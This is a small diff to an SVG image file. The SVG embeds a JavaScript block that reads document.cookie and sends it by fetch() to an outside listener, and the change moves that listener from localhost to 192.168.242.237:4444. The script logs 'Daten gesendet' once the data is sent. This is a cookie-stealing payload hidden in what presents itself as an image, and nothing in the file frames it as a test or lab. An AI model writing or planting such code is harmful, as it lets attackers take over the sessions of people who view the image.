@@ -1,6 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <script type="text/javascript">
-    fetch('http://127.0.0.1:8080/capture?data=' + document.cookie)
+    fetch('http://192.168.242.237:4444/capture?data=' + document.cookie)
       .then(response => console.log('Daten gesendet'));
   </script>
 </svg>
